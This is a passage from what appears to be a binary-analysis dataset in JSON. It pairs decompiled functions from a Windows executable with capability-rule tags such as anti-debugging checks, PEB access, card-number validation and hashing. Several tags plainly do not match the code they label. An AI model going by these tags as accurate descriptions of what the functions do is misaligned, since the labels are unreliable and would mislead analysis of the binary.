        "decompiled_code": "\nvoid __fastcall fcn.00425f8c(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_2 = param_2 + -1;\n    if (-1 < param_2) {\n        if (**0x4926b4 < 3) {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = uVar1 >> 0x10 & 0xff | CONCAT11(uVar1, uVar1 >> 8) << 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n        else {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = ((uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) >> 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00437a50": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00437a50(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar7 = 0;\n    piVar4 = fcn.00437994();\n    if (piVar4 == NULL) {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            cVar3 = fcn.004047dc();\n            if (cVar3 != '\\0') {\n                fcn.00436a3c();\n            }\n        }\n    }\n    else {\n        if ((*(piVar4 + 7) & 0x10) == 0) {\n            fcn.00436a3c();\n        }\n        (**(*piVar4 + 0x44))();\n        uVar5 = fcn.004370fc();\n        uVar2 = fcn.004375e4();\n        if ((uVar5 | uVar2) != 0) {\n            fcn.00434894();\n        }\n        uVar1 = *(**0x4925c4 + 0x44);\n        uVar5 = uVar5 & 0xffffff00;\n        if (((uVar1 != 0) && (uVar5 = uVar1,  *(uVar1 + 0x277) == '\\x02')) && (piVar4 == *(uVar1 + 0x2a0))) {\n            iVar6 = sub.user32.dll_SendMessageA(*(uVar1 + 0x29c), 0x234, 0, 0);\n            if (iVar6 != 0) {\n                uVar7 = fcn.00458568();\n                sub.user32.dll_DrawMenuBar(uVar7);\n            }\n        }\n        uVar7 = CONCAT31(uVar5 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 452
    },
    "0043eb48": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043eb48(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0043f498();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0043f4e4();\n            if (*(iVar2 + 0x273) == '\\x02') {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 126
    },
    "0043fc88": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0043fc88(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0xff000005;\n    if (*(in_EAX + 0x277) == '\\x02') {\n        uVar1 = 0xff00000c;\n    }\n    return uVar1;\n}\n",
        "token_count": 77
    },
    "0044e16c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044e16c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint lParam;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    if (in_EAX != 0) {\n        uVar1 = sub.user32.dll_SendMessageA();\n    }\n    return uVar1;\n}\n",
        "token_count": 116
    },
    "004894f0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004894f0(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff6c;\n    uint uStack112;\n    uint uStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint var_1ch;\n    uint uStack28;\n    uint var_14h;\n    uint var_10h;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    puStack68 = 0x489506;\n    fcn.004059cc();\n    uStack72 = 0x48961e;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uStack84 = 0x4895f7;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    var_5h = true;\n    if (**0x4927cc == 2) {\n        var_5h = 0;\n        puStack92 = &fcn.004894f0::TokenHandle;\n        uStack96 = 0x28;\n        uStack100 = 0x48954c;\n        puStack68 = &stack0xfffffffc;\n        uStack100 = sub.kernel32.dll_GetCurrentProcess();\n        puStack104 = 0x489552;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            uStack108 = 0x4895db;\n            uStack112 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff90;\n            puStack104 = &stack0xfffffffc;\n            uVar2 = fcn.004059dc(&fcn.004894f0::var_1ch);\n            iVar1 = sub.advapi32.dll_LookupPrivilegeValueA(0, uVar2);\n            if (iVar1 != 0) {\n                var_20h = 1;\n                if (param_2 == '\\0') {\n                    var_14h = 0;\n                }\n                else if (param_2 == '\\x01') {\n                    var_14h = 2;\n                }\n                var_10h = 0;\n                var_30h = 1;\n                uStack48 = var_1ch;\n                uStack44 = uStack28;\n                uStack40 = var_14h;\n                in_stack_ffffff6c = TokenHandle;\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (TokenHandle, 0, &fcn.004894f0::var_20h, 0x10, &fcn.004894f0::var_30h, &fcn.004894f0::var_10h)\n                ;\n            }\n            *in_FS_OFFSET = in_stack_ffffff6c;\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x4895e2);\n            return;\n        }\n        puStack104 = 0x4895e7;\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        var_5h = iVar1 == 0;\n        *in_FS_OFFSET = uStack100;\n    }\n    else {\n        *in_FS_OFFSET = uStack88;\n        puStack68 = &stack0xfffffffc;\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x489625;\n    uStack84 = 0x48961d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 874
    },
    "00422074": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.00422074(void)\n\n{\n    uchar *arg_8h;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = 4;\n    arg_8h = auStack8;\n    fcn.00422170(arg_8h, 4);\n    if (uVar1 != '\\x03') {\n        fcn.004215ac();\n    }\n    return CONCAT44(uVar1, arg_8h);\n}\n",
        "token_count": 103
    },
    "00454278": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00454278(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack32 = 0x45428f;\n    iVar1 = fcn.00454658();\n    if (iVar1 == 0) {\n        return;\n    }\n    puStack32 = 0x4542a3;\n    iVar1 = fcn.00404620();\n    puStack32 = 0x4542ae;\n    fcn.00454174();\n    uStack36 = 0x454366;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar2 = fcn.00454658();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0045461c();\n            if (*(iVar3 + 0x5b) - 3U < 2) {\n                fcn.0045461c();\n                fcn.00419730();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0040484c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x45436d;\n    while (0 < *(iVar1 + 8)) {\n        uStack36 = 0x454320;\n        iVar2 = fcn.00419888();\n        if (*(iVar2 + 0x5b) == '\\x03') {\n            uStack36 = 0x454331;\n            fcn.0044fb88();\n        }\n        else {\n            uStack36 = 0x45433c;\n            fcn.0044fb88();\n        }\n        uStack36 = 0x45434b;\n        fcn.0041977c();\n    }\n    uStack36 = 0x45435d;\n    fcn.00404650();\n    uStack36 = 0x454365;\n    fcn.0045417c();\n    return;\n}\n",
        "token_count": 497
    },
    "0046f91c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046f91c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    char *pcVar2;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar3;\n    \n    pcVar4 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    pcVar5 = *(in_EAX + 0x34) + param_2;\n    if ((*pcVar5 == *pcVar4) && (pcVar5[1] == pcVar4[1])) {\n        pcVar5 = pcVar5 + 2;\n        pcVar3 = pcVar4 + 2;\n        while (((((pcVar2 = pcVar3 + 1,  *pcVar2 == pcVar5[1] && (pcVar2 = pcVar3 + 2,  *pcVar2 == pcVar5[2])) &&\n                 (pcVar2 = pcVar3 + 3,  *pcVar2 == pcVar5[3])) &&\n                ((pcVar2 = pcVar3 + 4,  *pcVar2 == pcVar5[4] && (pcVar2 = pcVar3 + 5,  *pcVar2 == pcVar5[5])))) &&\n               ((pcVar2 = pcVar3 + 6,  *pcVar2 == pcVar5[6] && (pcVar2 = pcVar3 + 7,  *pcVar2 == pcVar5[7]))))) {\n            pcVar2 = pcVar3 + 8;\n            pcVar5 = pcVar5 + 8;\n            if ((*pcVar2 != *pcVar5) || (pcVar3 = pcVar2,  pcVar4 + 0x102 <= pcVar2)) break;\n        }\n        uVar1 = 0x102 - ((pcVar4 + 0x102) - pcVar2);\n        if (uVar1 < 3) {\n            uVar1 = 2;\n        }\n        else {\n            *(in_EAX + 0x6c) = param_2;\n            if (*(in_EAX + 0x70) < uVar1) {\n                uVar1 = *(in_EAX + 0x70);\n            }\n        }\n    }\n    else {\n        uVar1 = 2;\n    }\n    return uVar1;\n}\n",
        "token_count": 542
    },
    "0048b534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0048b534(void)\n\n{\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1(0x400, 0x5a, auStack12, 5);\n    if (iVar1 == 3) {\n        fcn.00405728();\n    }\n    else {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00405268": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00405268(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0x10;\n    iVar1 = *0x48f000;\n    do {\n        \"Runtime error     at 00000000\"[uVar2 & 0xff] = iVar1 % 10 + '0';\n        iVar1 = iVar1 / 10;\n        uVar2 = uVar2 - 1;\n    } while (iVar1 != 0);\n    uVar3 = 0x1c;\n    uVar2 = *0x48f004;\n    do {\n        \"Runtime error     at 00000000\"[uVar3 & 0xff] = str.0123456789ABCDEF[uVar2 & 0xf];\n        uVar2 = uVar2 / 0x10;\n        uVar3 = uVar3 - 1;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 223
    },
    "00409d14": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00409d1e: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00409d23)\n\nvoid __fastcall fcn.00409d14(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    if (param_1 == '\\0') {\n        if (in_EAX < 0) {\n            in_EAX = -in_EAX;\n        }\n        param_1 = 10;\n    }\n    do {\n        uVar2 = in_EAX / param_1;\n        puVar6 = puVar6 + -1;\n        cVar4 = in_EAX % param_1;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n        in_EAX = uVar2;\n    } while (uVar2 != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar1 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar1)[iVar5] = 0x30;\n        }\n        puVar6[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 402
    },
    "0040b078": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b078(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar2;\n    uint in_EAX;\n    uint32_t uVar1;\n    char unaff_BL;\n    uint32_t *puVar3;\n    uchar *unaff_EDI;\n    char *pcVar4;\n    uint32_t uStack8;\n    \n    *unaff_EDI = in_EAX;\n    if (unaff_BL == '\\0') {\n        param_2 = 0;\ncode_r0x0040b08e:\n        cVar2 = in_EAX >> 8;\n        pcVar4 = unaff_EDI + 1;\n        if (cVar2 == '\\0') goto code_r0x0040b095;\n    }\n    else {\n        if (-1 < param_2) goto code_r0x0040b08e;\n        cVar2 = '-';\n        param_2 = -param_2;\n    }\n    pcVar4 = unaff_EDI + 2;\n    unaff_EDI[1] = cVar2;\ncode_r0x0040b095:\n    puVar3 = &uStack8;\n    uStack8 = param_2;\n    do {\n        do {\n            uVar1 = param_2 / *0x48f88c;\n            *puVar3 = param_2 % *0x48f88c + '0';\n            puVar3 = puVar3 + 1;\n            param_1 = param_1 + -1;\n            param_2 = uVar1;\n        } while (uVar1 != 0);\n    } while (0 < param_1);\n    do {\n        puVar3 = puVar3 + -1;\n        *pcVar4 = *puVar3;\n        pcVar4 = pcVar4 + 1;\n    } while (puVar3 != &uStack8);\n    return uStack8;\n}\n",
        "token_count": 425
    },
    "0040b4df": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b4df(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar7;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    int16_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    float10 fVar15;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    uVar6 = *unaff_ESI;\n    uVar10 = unaff_ESI[1];\n    if ((uVar6 | uVar10) != 0) {\n        if (uVar10 < 0) {\n            bVar14 = uVar6 != 0;\n            uVar6 = -uVar6;\n            uVar10 = -bVar14 - uVar10;\n        }\n        iVar8 = 0;\n        iVar11 = *(unaff_EBP + 8);\n        if (iVar11 < 0) {\n            iVar11 = 0;\n        }\n        if (3 < iVar11) {\n            iVar11 = 4;\n            uVar2 = uVar6;\n            iVar3 = iVar8;\n            do {\n                iVar8 = iVar3;\n                uVar6 = uVar2;\n                bVar14 = 0xde0b6b2 < uVar10;\n                uVar1 = uVar10 + 0xf21f494d;\n                uVar10 = uVar1 - (uVar6 < 0xa7640000);\n                uVar2 = uVar6 + 0x589c0000;\n                iVar3 = iVar8 + 1;\n            } while (bVar14 && (uVar6 < 0xa7640000) <= uVar1);\n            uVar10 = uVar10 + 0xde0b6b3 + (0x589bffff < uVar6 + 0x589c0000);\n        }\n        *(unaff_EBP + -0x20) = uVar6;\n        *(unaff_EBP + -0x1c) = uVar10;\n        fVar15 = *(unaff_EBP + -0x20);\n        if (4 - iVar11 != 0) {\n            fVar15 = fVar15 / *(*(unaff_EBP + -4) + 0x40b4cb + (4 - iVar11) * 4);\n        }\n        *(unaff_EBP + -0x18) = fVar15;\n        piVar12 = unaff_EBX + 3;\n        if (iVar8 != 0) {\n            piVar13 = unaff_EBX + 2;\n            *piVar12 = iVar8 + '0';\n            iVar8 = 9;\n            goto code_r0x0040b576;\n        }\n        iVar8 = 9;\n        do {\n            uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n            uVar4 = CONCAT11(uVar9, uVar9 >> 4);\n            piVar13 = piVar12;\n            if (uVar9 >> 4 != 0) goto code_r0x0040b57f;\n            uVar7 = uVar4 >> 8;\n            if ((uVar9 & 0xf) != 0) goto code_r0x0040b586;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar5 = 0;\n    uVar9 = 0;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b5ac:\n    *unaff_EBX = iVar5;\n    *(unaff_EBX + 1) = uVar9;\n    return;\ncode_r0x0040b586:\n    while( true ) {\n        piVar13 = piVar12 + 1;\n        *piVar12 = (uVar7 & 0xf) + 0x30;\n        iVar8 = iVar8 + -1;\n        if (iVar8 == 0) break;\ncode_r0x0040b576:\n        uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n        uVar4 = CONCAT11(uVar9, uVar9 >> 4);\ncode_r0x0040b57f:\n        uVar7 = uVar4 >> 8;\n        piVar12 = piVar13 + 1;\n        *piVar13 = uVar4 + '0';\n    }\n    iVar5 = piVar13 - (unaff_EBX + 3 + iVar11);\n    do {\n        *piVar13 = '\\0';\n        piVar13 = piVar13 + -1;\n    } while (*piVar13 == '0');\n    uVar9 = unaff_ESI[1] >> 0x1f;\n    goto code_r0x0040b5ac;\n}\n",
        "token_count": 1155
    },
    "00444934": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00444934(void)\n\n{\n    fcn.0040f934();\n    return;\n}\n",
        "token_count": 24
    },
    "0040a7ac": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a7ac(uint arg_8h, uint arg_ch)\n\n{\n    uint var_12h;\n    int16_t var_eh;\n    int16_t var_ch;\n    uint var_ah;\n    uint16_t var_6h;\n    uint var_4h;\n    \n    fcn.0040bbd0(arg_8h, arg_ch);\n    if ((var_6h < 0x7bc) || (0x83b < var_6h)) {\n        var_4h = 0;\n    }\n    else {\n        fcn.0040b8f0(&var_12h, arg_8h, arg_ch);\n        var_4h = CONCAT22(var_ah._2_2_ << 5 | var_ah | (var_6h - 0x7bc) * 0x200, \n                          var_12h._2_2_ >> 1 | var_eh << 5 | var_ch << 0xb);\n    }\n    return var_4h;\n}\n",
        "token_count": 241
    },
    "00419d8c": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00419d8c(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 4) + 0x1f;\n    if (iVar1 < 0) {\n        iVar1 = *(in_EAX + 4) + 0x3e;\n    }\n    iStack16 = param_1;\n    if (-1 < (iVar1 >> 5) + -1) {\n        iVar3 = 0;\n        iStack16 = iVar1 >> 5;\n        do {\n            if (*0x419e00 != *(*(in_EAX + 8) + iVar3 * 4)) {\n                uVar2 = 0;\n                do {\n                    bVar4 = uVar2 < 0x1f;\n                    if (uVar2 < 0x20) {\n                        bVar4 = (*(*(in_EAX + 8) + iVar3 * 4) >> (uVar2 & 0x1f) & 1) != 0;\n                    }\n                    if (!bVar4) {\n                        iVar1 = iVar3 * 0x20 + (uVar2 & 0x7f);\n                        if (*(in_EAX + 4) <= iVar1) {\n                            iVar1 = *(in_EAX + 4);\n                        }\n                        goto code_r0x00419df8;\n                    }\n                    uVar2 = uVar2 + 1;\n                } while (uVar2 != ' ');\n            }\n            iVar3 = iVar3 + 1;\n            iStack16 = iStack16 + -1;\n        } while (iStack16 != 0);\n    }\n    iVar1 = *(in_EAX + 4);\ncode_r0x00419df8:\n    return CONCAT44(iStack16, iVar1);\n}\n",
        "token_count": 435
    },
    "0045ebe8": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ebe8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    uVar3 = in_EAX[1];\n    uVar4 = in_EAX[2];\n    uVar1 = in_EAX[3];\n    uVar2 = *in_EAX + *param_2 + *0x4907b0 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x4907b4 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar2;\n    uVar4 = uVar4 + param_2[2] + *0x4907b8 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar5 = (uVar4 * 0x20000 | uVar4 >> 0xf) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x4907bc + ((uVar2 ^ uVar1) & uVar5 ^ uVar2);\n    uVar6 = (uVar3 * 0x400000 | uVar3 >> 10) + uVar5;\n    uVar2 = uVar2 + param_2[4] + *0x4907c0 + ((uVar1 ^ uVar5) & uVar6 ^ uVar1);\n    uVar4 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar6;\n    uVar1 = uVar1 + param_2[5] + *0x4907c4 + ((uVar5 ^ uVar6) & uVar4 ^ uVar5);\n    uVar3 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar4;\n    uVar5 = uVar5 + param_2[6] + *0x4907c8 + ((uVar6 ^ uVar4) & uVar3 ^ uVar6);\n    uVar2 = (uVar5 * 0x20000 | uVar5 >> 0xf) + uVar3;\n    uVar6 = uVar6 + param_2[7] + *0x4907cc + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar6 * 0x400000 | uVar6 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x4907d0 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[9] + *0x4907d4 + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x4907d8 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xb] + *0x4907dc + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x4907e0 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[0xd] + *0x4907e4 + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x4907e8 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xf] + *0x4907ec + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x4907f0 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[6] + *0x4907f4 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + str.QZ._0_4_ + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + *param_2 + *0x4907fc + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x490800 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[10] + *0x490804 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x490808 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[4] + *0x49080c + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x490810 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[0xe] + *0x490814 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x490818 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[8] + *0x49081c + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x490820 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[2] + *0x490824 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x490828 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[0xc] + *0x49082c + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x490830 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | 